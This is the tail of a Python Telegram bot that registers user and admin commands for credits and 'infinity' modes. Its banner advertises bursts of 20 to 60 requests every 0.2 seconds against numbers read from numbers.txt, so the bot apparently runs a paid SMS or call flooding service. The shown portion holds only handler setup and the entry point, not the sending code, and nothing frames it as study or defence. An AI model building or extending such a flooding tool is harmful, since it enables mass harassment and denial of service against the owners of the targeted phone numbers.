        self.application.add_handler(CommandHandler("fast", self.ultra_fast_XMS))
        self.application.add_handler(CommandHandler("ultrainfinity", self.start_ultra_infinity))
        self.application.add_handler(CommandHandler("stopinfinity", self.stop_infinity))
        self.application.add_handler(CommandHandler("credits", self.check_credits))
        self.application.add_handler(CommandHandler("stats", self.user_stats))
        
        # Admin handlers
        self.application.add_handler(CommandHandler("users", self.admin_users))
        self.application.add_handler(CommandHandler("addcredits", self.admin_add_credits))
        self.application.add_handler(CommandHandler("setinfinity", self.admin_set_infinity))
        self.application.add_handler(CommandHandler("allstats", self.admin_all_stats))
        
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.GREEN}        ULTRA FAST TELECOM BOT - EXTREME EDITION{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW} Speed: 20 requests every 0.2 seconds{Colors.RESET}")
        print(f"{Colors.MAGENTA} Infinity: 40-60 requests every 0.2 seconds{Colors.RESET}")
        print(f"{Colors.BLUE} Admin ID: {ADMIN_USER_ID}{Colors.RESET}")
        print(f"{Colors.GREEN} Background: Reading from numbers.txt{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)

def main():
    bot = UltraFastTelegramBot()
    bot.run()

if __name__ == "__main__":
    main()
#[file content end]